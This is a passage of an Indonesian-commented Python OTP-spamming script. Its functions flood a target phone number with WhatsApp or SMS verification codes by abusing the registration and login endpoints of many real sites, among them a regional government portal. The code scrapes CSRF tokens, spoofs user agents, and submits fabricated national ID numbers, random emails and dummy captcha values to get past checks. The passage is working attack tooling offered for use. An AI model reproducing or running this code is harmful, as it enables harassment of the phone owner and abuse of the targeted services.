        register_result = register_resp.json()
        
        # Ambil CSRF token dari response register (kalo ada update)
        new_csrf = register_result.get('data', {}).get('csrf_token')
        if new_csrf:
            csrf_token = new_csrf
            print(f"✅ CSRF Token update: {csrf_token}")
        
        # JEDA 1 detik
        time.sleep(1)
        
        # STEP 2: Send OTP
        print("🔹 STEP 2: POST /send-otp")
        otp_url = "https://www.somethinc.com/ajax/send-otp"
        
        boundary2 = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        otp_headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": f"multipart/form-data; boundary={boundary2}",
            "origin": "https://www.somethinc.com",
            "referer": "https://www.somethinc.com/en/account/login",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": csrf_token,
            "x-requested-with": "XMLHttpRequest"
        }
        
        otp_data = f"""--{boundary2}
Content-Disposition: form-data; name="method"

w
--{boundary2}--
"""
        
        otp_resp = session.post(otp_url, headers=otp_headers, data=otp_data, timeout=60)
        print(f"✅ OTP Response: {otp_resp.text}")
        
        if otp_resp.status_code == 200:
            otp_result = otp_resp.json()
            if otp_result.get('status_code') == 200:
                print(f"✅ SUKSES! OTP terkirim via WA")
                return True
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        import traceback
        traceback.print_exc()
        return False

def spam_otp_paper(nomor):
    try:
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = "62" + raw[1:]
        elif not raw.startswith('62'):
            raw = "62" + raw

        payload = {"phone": raw, "method": "whatsapp", "registered_by": "web"}
        resp = requests.post("https://register.paper.id/api/v1/auth/register/send-otp", json=payload, headers={"Host": "register.paper.id", "Content-Type": "application/json", "Accept": "application/json, text/plain, */*", "request-id": "0B2AxAPS1jTfThi-iFCKJOhOjG-LmuB85T1f6-OdWgIMKhGqQZsQ", "x-paper-user-agent": "Jupiter/7.13.19 mobile_web (linux) Chrome 147", "Origin": "https://www.paper.id", "Referer": "https://www.paper.id/", "User-Agent": get_random_ua()}, timeout=115)
        return resp.status_code == 200
    except:
        return False

def spam_otp_rumah123(nomor):
    try:
        import re
        import requests
        import random
        import json
        
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            raw = '62' + raw[1:]
        if not raw.startswith('62'):
            raw = '62' + raw
        
        # Get IP address (pake layanan gratis)
        ip_address = "157.10.97.34"  # default
        try:
            ip_resp = requests.get("https://api.ipify.org?format=json", timeout=155)
            ip_data = ip_resp.json()
            ip_address = ip_data.get("ip", "157.10.97.34")
        except:
            pass
        
        # Random User-Agent
        ua_list = [
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Xiaomi12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.164 Mobile Safari/537.36"
        ]
        random_ua = random.choice(ua_list)
        
        url = "https://www.rumah123.com/api/otp/request-otp"
        headers = {
            "accept": "application/json, text/plain, */*",
            "base-url-core": "https://www.rumah123.com",
            "content-type": "application/json;charset=UTF-8",
            "User-Agent": random_ua,
            "Origin": "https://www.rumah123.com",
            "Referer": "https://www.rumah123.com/user/login"
        }
        payload = {
            "cancelledRequestId": "",
            "ipAddress": ip_address,
            "phoneNumber": raw,
            "portalId": 1,
            "type": "WHATSAPP",
            "url": "https://www.rumah123.com/user/login?redirect=https://www.rumah123.com/jual-properti-online/"
        }
        
        resp = requests.post(url, json=payload, headers=headers, timeout=110)
        data = resp.json()
        
        # Cek sukses: response status 200 DAN ada requestId (berarti OTP terkirim)
        if resp.status_code == 200 and data.get("response", {}).get("requestId"):
            return True
        
        # Alternative: cek kalau ada nextEventWait
        if resp.status_code == 200 and data.get("response", {}).get("nextEventWait"):
            return True
        
        return False
        
    except:
        return False

def spam_otp_plastic4trade(nomor):
    try:
        import re
        import requests
        from bs4 import BeautifulSoup
        import time
        
        # Format nomor: 81274307931 (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        phone = raw
        
        session = requests.Session()
        
        # STEP 1: GET halaman utama - ambil cookie & token
        print("🔹 STEP 1: GET / (ambil cookie & csrf-token)")
        url = "https://plastic4trade.com/polymer-price-today-update-list-graph"
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.google.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(url, headers=headers, timeout=60)
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # Ambil CSRF token dari meta tag
        soup = BeautifulSoup(resp.text, 'html.parser')
        csrf_meta = soup.find('meta', {'name': 'csrf-token'})
        
        if not csrf_meta:
            print("❌ CSRF token tidak ditemukan di HTML")
            return False
        
        csrf_token = csrf_meta.get('content')
        print(f"✅ CSRF Token: {csrf_token}")
        
        # STEP 2: POST /register/step1 - kirim OTP
        print("🔹 STEP 2: POST /register/step1")
        otp_url = "https://plastic4trade.com/register/step1"
        otp_headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://plastic4trade.com",
            "referer": "https://plastic4trade.com/polymer-price-today-update-list-graph",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        otp_data = {
            "_token": csrf_token,
            "phoneno": phone,
            "countryCode": "+62"
        }
        
        print(f"📱 Mengirim OTP ke: {phone}")
        resp = session.post(otp_url, data=otp_data, headers=otp_headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('status') == True:
                print(f"✅ SUKSES! User ID: {result.get('user_id')}")
                return True
            else:
                print(f"❌ GAGAL: {result.get('message')}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_aisamarth(nomor):
    try:
        import re
        import requests
        import time
        import urllib.parse
        
        # Format nomor: %2B62 + raw (tanpa 0 di depan)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            phone_raw = '62' + raw[1:]
        elif raw.startswith('62'):
            phone_raw = raw
        else:
            phone_raw = '62' + raw
        
        # URL encode: +62 -> %2B62
        phone = '%2B' + phone_raw
        
        session = requests.Session()
        
        url = f"https://aisamarth-sso.workers.centa.org/send-otp?phone={phone}"
        
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "origin": "https://aisamarth.centa.org",
            "referer": "https://aisamarth.centa.org/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        print(f"📱 Mengirim OTP WA ke: {phone_raw}")
        resp = session.get(url, headers=headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('success') == True:
                print(f"✅ SUKSES! Request ID: {result.get('requestId')}")
                return True
            else:
                print(f"❌ GAGAL: {result}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_yourmedpass(nomor):
    try:
        import re
        import requests
        from bs4 import BeautifulSoup
        import time
        
        # Format nomor: 81274307931 (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        # Ambil 10-11 digit terakhir (format contoh: 81274307931)
        phone = raw
        
        session = requests.Session()
        
        # STEP 1: GET halaman register - ambil cookie & CSRF token
        print("🔹 STEP 1: GET /register (ambil cookie & csrf-token)")
        url = "https://yourmedpass.com/register"
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.google.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(url, headers=headers, timeout=60)
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # Ambil CSRF token dari meta tag
        soup = BeautifulSoup(resp.text, 'html.parser')
        csrf_meta = soup.find('meta', {'name': 'csrf-token'})
        
        if not csrf_meta:
            print("❌ CSRF token tidak ditemukan di HTML")
            return False
        
        csrf_token = csrf_meta.get('content')
        print(f"✅ CSRF Token: {csrf_token}")
        
        # STEP 2: POST /register/send-code - kirim OTP via WA
        print("🔹 STEP 2: POST /register/send-code")
        otp_url = "https://yourmedpass.com/register/send-code"
        otp_headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://yourmedpass.com",
            "referer": "https://yourmedpass.com/register",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": csrf_token,
            "x-requested-with": "XMLHttpRequest"
        }
        
        otp_data = {
            "phone_number": phone,
            "country_code": "62",
            "governorate": "",
            "country": "ID"
        }
        
        print(f"📱 Mengirim OTP WA ke: {phone}")
        resp = session.post(otp_url, json=otp_data, headers=otp_headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('success') == True:
                print(f"✅ SUKSES! Token: {result.get('token')}")
                return True
            else:
                print(f"❌ GAGAL: {result}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

# ============================================================
# FINAL.SA - OTP VIA WHATSAPP (AUTO CSRF + SESSION)
# ============================================================

def spam_otp_final_sa(nomor):
    try:
        import re
        import uuid
        import requests

        # ====== FORMAT NOMOR ======
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('62'):
            raw = raw[2:]
        elif raw.startswith('0'):
            raw = raw[1:]

        phone_only = raw
        country_id = 28

        # ====== DEVICE ======
        device_id = str(uuid.uuid4())
        device_token = str(uuid.uuid4())

        print()
        print(f"TARGET   : +62 {phone_only}")
        print()

        # ====== SESSION ======
        session = requests.Session()

        headers_init = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "ar",
            "upgrade-insecure-requests": "1",
            "sec-ch-ua": '"Chromium";v="154", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36"
        }

        # ====== STEP 0A: GET /more (set cookie umum) ======
        print("STEP 0A : GET /more")
        print()

        session.get("https://final.sa/more", headers=headers_init, timeout=60)

        print(f"Cookie   : {list(session.cookies.get_dict().keys())}")
        print()

        # ====== STEP 0B: GET /api/auth/csrf (ambil CSRF token) ======
        print("STEP 0B : GET /api/auth/csrf")
        print()

        resp_csrf = session.get(
            "https://final.sa/api/auth/csrf",
            headers={**headers_init, "accept": "application/json"},
            timeout=60
        )

        print(f"Status   : {resp_csrf.status_code}")
        print(f"Response : {resp_csrf.text[:300]}")
        print()

        csrf_token = None
        try:
            csrf_data = resp_csrf.json()
            csrf_token = csrf_data.get("csrfToken")
        except Exception:
            pass

        if csrf_token:
            print(f"CSRF     : {csrf_token[:40]}...")
        else:
            print("CSRF     : tidak dapet dari /api/auth/csrf")
        print()

        # ====== SET DEVICE COOKIE ======
        session.cookies.set("device_id", device_id, domain="final.sa", path="/")
        session.cookies.set("device_token", device_token, domain="final.sa", path="/")

        # ====== STEP 1: POST /api/proxy/login ======
        print("STEP 1 : POST /api/proxy/login")
        print()

        headers_login = {
            "Accept": "application/json",
            "Accept-Language": "ar",
            "Content-Type": "application/json",
            "device-id": device_id,
            "device-token": device_token,
            "platform": "web",
            "Origin": "https://final.sa",
            "Referer": "https://final.sa/more",
            "sec-ch-ua": '"Chromium";v="154", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36"
        }

        # Tambah header CSRF kalau ada
        if csrf_token:
            headers_login["x-csrf-token"] = csrf_token
            headers_login["csrf-token"] = csrf_token

        payload = {
            "phone": phone_only,
            "country_id": country_id,
            "verify_via": "whatsapp"
        }

        # Coba kirim csrfToken juga di body (beberapa server butuh ini)
        if csrf_token:
            payload["csrfToken"] = csrf_token

        resp_login = session.post(
            "https://final.sa/api/proxy/login",
            json=payload,
            headers=headers_login,
            timeout=60
        )

        print(f"Status   : {resp_login.status_code}")
        print(f"Response : {resp_login.text[:400]}")
        print()

        # ====== PARSE ======
        try:
            result = resp_login.json()
        except Exception:
            print("Response bukan JSON valid")
            print()
            return False

        if result.get("status") is True and result.get("code") == 200:
            data = result.get("data") or {}
            print(f"SUKSES   : OTP terkirim ke {data.get('country_code','+62')} {data.get('phone', phone_only)}")
            print(f"User ID  : {data.get('id', '-')}")
            print()
            return True
        else:
            print(f"GAGAL    : [{result.get('code')}] {result.get('message')}")
            print()
            return False

    except Exception as e:
        print()
        print(f"ERROR    : {e}")
        print()
        return False

def spam_otp_smartwhats(nomor):
    try:
        import re
        import requests
        import json
        
        # Format nomor: 62 + raw (tanpa 0 di depan)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            phone = '62' + raw[1:]
        elif raw.startswith('62'):
            phone = raw
        else:
            phone = '62' + raw
        
        session = requests.Session()
        
        url = "https://wa.smart-whats.com/auth/send-otp"
        
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://wa.smart-whats.com",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        payload = {
            "phone": phone
        }
        
        print(f"📱 Mengirim OTP WA ke: {phone}")
        resp = session.post(url, json=payload, headers=headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('success') == True:
                print(f"✅ SUKSES! {result.get('message')}")
                return True
            else:
                print(f"❌ GAGAL: {result}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_ezdehar(nomor):
    try:
        import re
        import requests
        import json
        import random
        import string
        import time
        
        # Format nomor: +62 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            phone = '+62' + raw[1:]
        elif raw.startswith('62'):
            phone = '+62' + raw
        else:
            phone = '+62' + raw
        
        # Generate random email
        email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@gmail.com"
        
        # Generate CAPTCHA dummy (string panjang random)
        captcha = ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=500))
        
        session = requests.Session()
        
        url = "https://ezdehar.qcharity.org/_vti_bin/QC/service.svc/SubmitUserCode"
        
        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json; charset=UTF-8",
            "origin": "https://ezdehar.qcharity.org",
            "referer": "https://ezdehar.qcharity.org/ar/Pages/Volunteer-Details.aspx?ID=69",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        payload = {
            "Id": 0,
            "Title": email,
            "Mobile": phone,
            "Captcha": captcha
        }
        
        print(f"📱 Mengirim OTP ke: {phone}")
        print(f"📧 Email: {email}")
        print(f"🔑 Captcha length: {len(captcha)}")
        
        resp = session.post(url, json=payload, headers=headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        # Response berupa angka (34937 = success code)
        if resp.status_code == 200:
            try:
                result = resp.text.strip()
                # Cek apakah response adalah angka (success code)
                if result.isdigit() and int(result) > 0:
                    print(f"✅ SUKSES! Code: {result}")
                    return True
                else:
                    print(f"❌ GAGAL: {result}")
                    return False
            except:
                # Coba parse JSON
                try:
                    result = resp.json()
                    if result.get('success') == True or result.get('d') == True:
                        return True
                except:
                    pass
                print(f"❌ GAGAL: {resp.text}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_tflow(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format nomor: +62 + raw
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            phone = '+62' + raw[1:]
        elif raw.startswith('62'):
            phone = '+62' + raw
        else:
            phone = '+62' + raw
        
        session = requests.Session()
        
        # STEP 1: GET /create-app - ambil cookie
        print("🔹 STEP 1: GET /create-app (ambil cookie)")
        url = "https://tflow.ly/create-app"
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.google.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(url, headers=headers, timeout=60)
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # STEP 2: GET /api/csrf-token - ambil CSRF token
        print("🔹 STEP 2: GET /api/csrf-token (ambil csrf)")
        csrf_url = "https://tflow.ly/api/csrf-token"
        csrf_headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://tflow.ly/create-app",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        csrf_resp = session.get(csrf_url, headers=csrf_headers, timeout=60)
        print(f"✅ CSRF Response: {csrf_resp.text}")
        
        if csrf_resp.status_code != 200:
            print("❌ Gagal ambil CSRF token")
            return False
        
        csrf_data = csrf_resp.json()
        csrf_token = csrf_data.get('csrfToken')
        
        if not csrf_token:
            print("❌ CSRF token tidak ditemukan")
            return False
        
        print(f"✅ CSRF Token: {csrf_token}")
        
        # STEP 3: POST /api/send-whatsapp-code - kirim OTP
        print("🔹 STEP 3: POST /api/send-whatsapp-code")
        otp_url = "https://tflow.ly/api/send-whatsapp-code"
        otp_headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://tflow.ly",
            "referer": "https://tflow.ly/create-app",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-csrf-token": csrf_token
        }
        
        otp_payload = {
            "phoneNumber": phone,
            "_csrf": csrf_token
        }
        
        print(f"📱 Mengirim OTP WA ke: {phone}")
        resp = session.post(otp_url, json=otp_payload, headers=otp_headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('success') == True:
                print(f"✅ SUKSES!")
                return True
            else:
                print(f"❌ GAGAL: {result}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_toss(nomor):
    try:
        import re
        import requests
        import random
        
        # Format nomor: 0 + raw (tanpa 62)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            phone = raw
        else:
            phone = '0' + raw
        
        # Generate NIK random 16 digit
        provinsi = str(random.randint(1, 34)).zfill(2)
        kabupaten = str(random.randint(1, 99)).zfill(2)
        hari = str(random.randint(1, 31)).zfill(2)
        bulan = str(random.randint(1, 12)).zfill(2)
        tahun = str(random.randint(0, 99)).zfill(2)
        kecamatan = str(random.randint(1, 99)).zfill(2)
        kelurahan = str(random.randint(1, 99)).zfill(2)
        urut = str(random.randint(1, 99)).zfill(2)
        nik = provinsi + kabupaten + hari + bulan + tahun + kecamatan + kelurahan + urut
        
        session = requests.Session()
        
        # STEP 1: GET register - ambil _token
        print("🔹 STEP 1: GET /register (ambil _token)")
        get_url = "https://toss.tubankab.go.id/register"
        get_headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        r0 = session.get(get_url, headers=get_headers, timeout=10)
        
        # Ambil _token dari HTML
        token_match = re.search(r"'_token':\s*'([^']+)'", r0.text)
        if not token_match:
            token_match = re.search(r'name="_token"\s+value="([^"]+)"', r0.text)
        
        if not token_match:
            print("❌ Token tidak ditemukan")
            return False
        
        csrf = token_match.group(1)
        print(f"✅ Token: {csrf}")
        
        # STEP 2: POST /register/otp/act - kirim OTP
        print("🔹 STEP 2: POST /register/otp/act")
        otp_url = "https://toss.tubankab.go.id/register/otp/act"
        otp_headers = {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        otp_data = f"nik={nik}&nohp={phone}&_token={csrf}"
        
        print(f"📱 Mengirim OTP WA ke: {phone}")
        print(f"🆔 NIK: {nik}")
        
        r3 = session.post(otp_url, headers=otp_headers, data=otp_data, timeout=10)
        print(f"✅ Response: {r3.text}")
        
        result = r3.json()
        if result.get("status") == "success":
            print(f"✅ SUKSES! Session ID: {result.get('session_id')}")
            return True
        else:
            print(f"❌ GAGAL: {result}")
            return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_vdcloud(nomor):
    try:
        import re
        import requests
        import random
        import string
        
        # Format nomor: +62 + raw (tanpa 0 di depan)
        raw = re.sub(r'\D', '', nomor)
        if raw.startswith('0'):
            phone = '+62' + raw[1:]
        elif raw.startswith('62'):
            phone = '+62' + raw
        else:
            phone = '+62' + raw
        
        # Generate random email
        email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@gmail.com"
        
        session = requests.Session()
        
        # STEP 1: GET /web/signup - ambil cookie
        print("🔹 STEP 1: GET /web/signup (ambil cookie)")
        url = "https://vdcloud.slbus.in/web/signup"
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.google.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(url, headers=headers, timeout=60)
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # STEP 2: POST /vd-cloud/api/v1/authenticate/mobile/request-otp - kirim OTP
        print("🔹 STEP 2: POST /vd-cloud/api/v1/authenticate/mobile/request-otp")
        otp_url = "https://vdcloud.slbus.in/vd-cloud/api/v1/authenticate/mobile/request-otp"
        otp_headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://vdcloud.slbus.in",
            "referer": "https://vdcloud.slbus.in/web/signup",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        payload = {
            "mobile": phone,
            "login": email,
            "whatsapp": True,
            "message": False
        }
        
        print(f"📱 Mengirim OTP WA ke: {phone}")
        print(f"📧 Email: {email}")
        resp = session.post(otp_url, json=payload, headers=otp_headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('result', {}).get('success') == True:
                print(f"✅ SUKSES! {result.get('result', {}).get('message')}")
                return True
            else:
                print(f"❌ GAGAL: {result}")
                return False
        
        return False
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        return False

def spam_otp_toys4home(nomor):
    try:
        import re
        import requests
        import json
        import time
        
        # Format nomor: 81274307931 (tanpa 0/62)
        raw = re.sub(r'\D', '', nomor)
        phone = raw
        
        session = requests.Session()
        
        # STEP 1: GET /login - ambil cookie
        print("🔹 STEP 1: GET /login (ambil cookie)")
        url = "https://toys4home.com/login"
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://www.google.com/",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        resp = session.get(url, headers=headers, timeout=60)
        print(f"✅ Cookie: {session.cookies.get_dict()}")
        
        # STEP 2: POST /api/v2/ar/login_whats_otp - kirim OTP
        print("🔹 STEP 2: POST /api/v2/ar/login_whats_otp")
        otp_url = "https://toys4home.com/api/v2/ar/login_whats_otp"
        otp_headers = {
            "accept": "application/json",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://toys4home.com",
            "referer": "https://toys4home.com/login",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "currency": "KWD"
        }
        
        payload = {
            "code": "62",
            "mobile": phone
        }
        
        print(f"📱 Mengirim OTP WA ke: {phone}")
        resp = session.post(otp_url, json=payload, headers=otp_headers, timeout=60)
        print(f"✅ Response: {resp.text}")
        
        if resp.status_code == 200:
            result = resp.json()
            if result.get('success') == True:
                print(f"✅ SUKSES! {result.get('message')}")
                return True
            else:
